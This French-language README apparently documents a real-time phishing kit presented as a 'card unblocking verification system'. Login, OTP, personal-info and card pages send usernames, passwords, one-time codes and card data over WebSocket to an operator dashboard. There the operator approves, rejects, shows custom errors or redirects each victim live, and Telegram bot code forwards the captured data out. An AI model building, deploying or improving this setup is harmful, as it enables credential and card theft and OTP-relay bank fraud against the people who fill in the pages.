# 🛡️ Real-Time Verification System

Système de vérification en temps réel avec WebSocket pour le déblocage de carte.

## 📋 Architecture

```
┌─────────────────┐     WebSocket      ┌──────────────────┐
│   User Pages    │ ◄───────────────► │  WebSocket Server │
│  (login, otp,   │                    │   (Node.js)       │
│   personal,     │                    └────────┬─────────┘
│   card)         │                             │
└─────────────────┘                             │ WebSocket
                                                │
                                    ┌───────────▼───────────┐
                                    │     Dashboard         │
                                    │  (Staff Verification) │
                                    └───────────────────────┘
```

## 🚀 Démarrage

### 1. Installer les dépendances

```bash
cd server
npm install
```

### 2. Lancer le serveur WebSocket

```bash
npm start
# ou
node websocket-server.js
```

Le serveur démarre sur `ws://localhost:8080`

### 3. Ouvrir le Dashboard

Ouvrir `dashboard.html` dans un navigateur pour l'équipe de vérification.

### 4. Tester le flow utilisateur

Ouvrir `index.html` dans un autre navigateur/onglet pour simuler un utilisateur.

## 📡 Flow de Communication

### Côté Utilisateur → Serveur

| Event | Description |
|-------|-------------|
| `register` | Enregistrement de la session (page actuelle) |
| `login_attempt` | Envoi des credentials (username, password) |
| `otp_attempt` | Envoi du code OTP |
| `personal_info_submit` | Envoi des infos personnelles |
| `card_info_submit` | Envoi des infos de carte |

### Côté Dashboard → Serveur → Utilisateur

| Event | Description |
|-------|-------------|
| `approve` | Approuver et rediriger l'utilisateur |
| `reject` | Rejeter avec message d'erreur |
| `show_error` | Afficher un message d'erreur personnalisé |
| `redirect` | Rediriger vers une URL spécifique |

## 🔧 Configuration

### Changer l'URL du WebSocket

Dans chaque fichier HTML, modifier la constante `WS_URL`:

```javascript
const WS_URL = "ws://votre-serveur:8080";
```

### Déploiement Production

Pour la production, utiliser `wss://` (WebSocket Secure) avec un certificat SSL.

## 📱 Intégration Telegram

Pour recevoir les notifications sur Telegram, ajouter dans `websocket-server.js`:

```javascript
const TELEGRAM_BOT_TOKEN = 'your_bot_token';
const TELEGRAM_CHAT_ID = 'your_chat_id';

async function sendTelegramNotification(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  });
}
```

## 📂 Structure des Fichiers

```
standard/
├── index.html          # Page de login
├── otp.html            # Page OTP
├── personal-info.html  # Page infos personnelles
├── card-confirm.html   # Page confirmation carte
├── dashboard.html      # Dashboard de vérification
└── server/
    ├── websocket-server.js  # Serveur WebSocket
    ├── package.json
    └── README.md
```

## ⚡ Fonctionnalités

- ✅ Connexion WebSocket temps réel
- ✅ Reconnexion automatique
- ✅ Dashboard avec toutes les sessions actives
- ✅ Notification sonore sur nouvelle demande
- ✅ Approve/Reject instantané
- ✅ Messages d'erreur personnalisables
- ✅ Redirection vers n'importe quelle page

